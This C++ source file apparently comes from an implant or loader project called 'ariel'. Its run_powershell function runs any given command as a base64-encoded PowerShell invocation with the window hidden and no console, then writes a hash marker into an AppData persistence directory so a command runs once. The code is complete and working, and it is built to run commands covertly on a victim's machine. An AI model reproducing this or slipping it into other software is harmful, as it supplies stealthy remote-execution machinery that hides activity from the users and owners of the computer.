#include "script.hpp"

#include "persist.hpp"
#include "util.hpp"

#include <windows.h>
#include <wincrypt.h>

#include <cstdio>
#include <cstdint>
#include <string>
#include <system_error>
#include <vector>

namespace ariel::script {

namespace {

std::string base64(const std::wstring& value) {
    if (value.empty()) return {};
    const auto* bytes = reinterpret_cast<const BYTE*>(value.data());
    const DWORD input_size = static_cast<DWORD>(value.size() * sizeof(wchar_t));
    DWORD output_size = 0;
    if (!CryptBinaryToStringW(bytes, input_size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                              nullptr, &output_size))
        return {};
    std::wstring output(output_size, L'\0');
    if (!CryptBinaryToStringW(bytes, input_size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                              output.data(), &output_size))
        return {};
    output.resize(output_size);
    while (!output.empty() && (output.back() == L'\0' || output.back() == L'\r' || output.back() == L'\n'))
        output.pop_back();
    return util::to_utf8(output);
}

std::string command_hash(const std::string& value) {
    uint64_t hash = 14695981039346656037ull;
    for (const unsigned char c : value) {
        hash ^= c;
        hash *= 1099511628211ull;
    }
    char text[32]{};
    std::snprintf(text, sizeof(text), "%016llX", static_cast<unsigned long long>(hash));
    return text;
}

void wait_for_process(HANDLE process, std::string& detail) {
    const DWORD status = WaitForSingleObject(process, 30000);
    if (status == WAIT_TIMEOUT) {
        detail = "started, still running";
        return;
    }
    DWORD code = 0;
    GetExitCodeProcess(process, &code);
    detail = code == 0 ? "completed" : "exit " + std::to_string(code);
}

}  // namespace

result run_powershell(const std::string& command,
                      const bool every_run,
                      const std::string& appdata_dir,
                      std::string& error) {
    if (command.empty()) return {false, "empty command"};

    const auto directory = persist::install_directory(appdata_dir);
    const auto marker = directory / "ps_once.marker";
    const std::string hash = command_hash(command);

    if (!every_run) {
        std::string existing;
        if (util::read_text(marker, existing) && util::trim(existing) == hash)
            return {true, "already ran"};
    }

    const std::wstring encoded = util::from_utf8(base64(util::from_utf8(command)));
    std::wstring line =
        L"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand " + encoded;

    STARTUPINFOW startup{};
    startup.cb = sizeof(startup);
    startup.dwFlags = STARTF_USESHOWWINDOW;
    startup.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION process{};
    if (!CreateProcessW(nullptr, line.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr,
                        nullptr, &startup, &process)) {
        error = "CreateProcess failed " + std::to_string(GetLastError());
        return {false, error};
    }

    std::string detail;
    wait_for_process(process.hProcess, detail);
    CloseHandle(process.hThread);
    CloseHandle(process.hProcess);

    if (!every_run) {
        std::error_code fs_error;
        util::fs::create_directories(directory, fs_error);
        util::write_text(marker, hash);
    }
    return {true, detail};
}

}  // namespace ariel::script
